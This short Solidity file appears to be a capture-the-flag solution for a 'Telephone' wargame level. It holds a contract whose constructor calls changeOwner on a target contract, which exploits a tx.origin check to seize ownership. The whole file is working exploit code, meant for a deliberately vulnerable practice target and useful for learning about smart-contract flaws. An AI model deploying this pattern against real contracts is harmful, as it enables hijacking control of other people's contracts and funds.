pragma solidity ^0.8;

interface ITelephone {
    function owner() external view returns (address);
    function changeOwner(address) external;
}

contract TelephoneHack {
    constructor(address _target) {
        ITelephone(_target).changeOwner(msg.sender);
    }
}